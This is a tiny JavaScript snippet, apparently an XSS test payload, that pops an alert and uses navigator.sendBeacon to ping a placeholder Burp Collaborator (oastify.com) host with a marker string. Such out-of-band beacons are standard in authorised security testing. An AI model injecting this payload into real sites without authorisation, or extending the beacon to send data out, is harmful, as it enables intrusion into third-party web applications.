// Example: Test payload that triggers alert and sends beacon
alert("Payload loaded!");

navigator.sendBeacon("https://your-burp-collab-url.oastify.com", "test-payload-loaded");
